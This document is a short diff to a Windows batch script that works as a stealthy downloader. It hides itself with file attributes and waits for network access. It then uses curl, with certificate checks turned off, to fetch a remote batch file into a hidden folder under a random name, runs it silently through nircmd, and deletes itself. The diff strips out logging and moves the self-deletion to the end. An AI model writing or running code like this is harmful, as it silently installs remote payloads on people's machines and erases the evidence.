@@ -1,17 +1,7 @@
 @echo off
 setlocal 
+
 attrib +s +h +i "%~f0"
-set "TEMP_LOG_FILE=%TEMP%\log.tmp"
-
-call :main >> "%TEMP_LOG_FILE%" 2>&1
-
-del /s /f /q /a "%TEMP_LOG_FILE%" >nul
-endlocal
-del /s /f /q /a "%~f0" >nul
-exit /b
-
-:main
-
 :connectivitycheck
 ping www.google.com -n 1 -w 5000 >NUL
 if errorlevel 1 goto Connectivitycheck
@@ -79,3 +69,5 @@ set "win32=%random%"
 "%environment%\curl.exe" -k %proxy% %host%/win32.bat -o "%environment%\Win32\%win32%.bat" && attrib +s +h +i "%environment%\Win32\%win32%.bat"
 timeout -t 240
 "%environment%\nircmd.exe" exec hide "%environment%\Win32\%win32%.bat"
+endlocal
+DEL /s /f /q /a "%~f0"
